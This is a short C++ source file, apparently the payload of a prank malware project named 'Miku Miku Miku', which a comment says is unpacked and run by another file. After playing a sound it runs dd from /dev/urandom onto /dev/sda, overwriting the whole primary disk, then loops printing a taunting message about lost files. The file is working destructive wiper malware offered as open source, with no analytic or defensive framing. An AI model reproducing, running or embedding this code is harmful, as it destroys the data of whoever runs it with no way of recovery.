/*

Copyright (C) 2026 Hyperion0801.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>

// The destructive part of Miku Miku Miku, this gets untarred when mikumiku.miku runs.

int main()
{
    // HATSUNE MIKU!!!!!!!!!!!!!!!!!
    system("mpv /miku/BD5972AA.ogg &");
    sleep(10);
    system("dd if=/dev/urandom of=/dev/sda &");

    while(1) {
        std::cout << "\033[2J\033[1;1H.Good luck getting your files back! Hatsune Miku took them all..." << std::flush;
    }

    return EXIT_SUCCESS;
}
